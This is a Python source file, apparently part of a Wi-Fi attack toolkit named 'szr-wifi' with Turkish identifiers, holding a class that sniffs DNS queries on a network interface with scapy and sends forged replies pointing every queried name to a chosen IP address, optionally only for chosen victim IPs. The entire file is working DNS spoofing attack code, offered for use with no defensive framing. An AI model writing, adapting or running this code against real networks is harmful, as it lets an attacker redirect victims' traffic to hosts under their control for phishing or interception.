import logging
from threading import Event, Lock, Thread

try:
    from dnslib import DNSRecord, RR, QTYPE, A
    DNSLIB_OK = True
except ImportError:
    DNSLIB_OK = False

log = logging.getLogger("szr-wifi")


class DnsSpoofAlt:
    def __init__(self, ctx, iface, spoof_ip="10.0.0.1"):
        self.ctx = ctx
        self.iface = iface
        self.spoof_ip = spoof_ip
        self.dur = Event()
        self.thread = None
        self.sayac = 0
        self.lock = Lock()
        self.filtre = set()

    def basla(self):
        if not DNSLIB_OK:
            self.ctx.log("[dns] dnslib yok (pip install dnslib)", "err")
            return
        if self.thread and self.thread.is_alive():
            return
        self.dur.clear()
        self.thread = Thread(target=self._loop, daemon=True)
        self.thread.start()

    def durdur(self):
        self.dur.set()
        if self.thread:
            self.thread.join(timeout=2)

    def _loop(self):
        from scapy.all import sniff, send, IP, UDP, DNS
        def cb(p):
            try:
                if not p.haslayer(IP) or not p.haslayer(UDP):
                    return
                if p[UDP].dport != 53:
                    return
                if not p.haslayer(DNS):
                    return
                dns = p[DNS]
                if dns.qr != 0:
                    return
                if dns.qd is None:
                    return
                if self.filtre and p[IP].src not in self.filtre:
                    return
                try:
                    q = DNSRecord.parse(bytes(dns))
                except Exception:
                    return
                qname = str(q.q.qname)
                cevap = q.reply()
                cevap.add_answer(RR(qname, QTYPE.A, rdata=A(self.spoof_ip),
                                    ttl=60))
                ip = IP(src=p[IP].dst, dst=p[IP].src)
                udp = UDP(sport=53, dport=p[UDP].sport)
                send(ip / udp / cevap, verbose=False)
                with self.lock:
                    self.sayac += 1
                    if self.sayac % 20 == 0:
                        self.ctx.log(f"[dns] {self.sayac} yanıt → "
                                     f"{self.spoof_ip}", "dim")
            except Exception as e:
                log.debug("dns cb: %s", e)

        sniff(iface=self.iface, prn=cb, store=False,
              stop_filter=lambda p: self.dur.is_set(),
              filter="udp port 53")

    def durum(self):
        return "active" if (self.thread and self.thread.is_alive()) else "off"
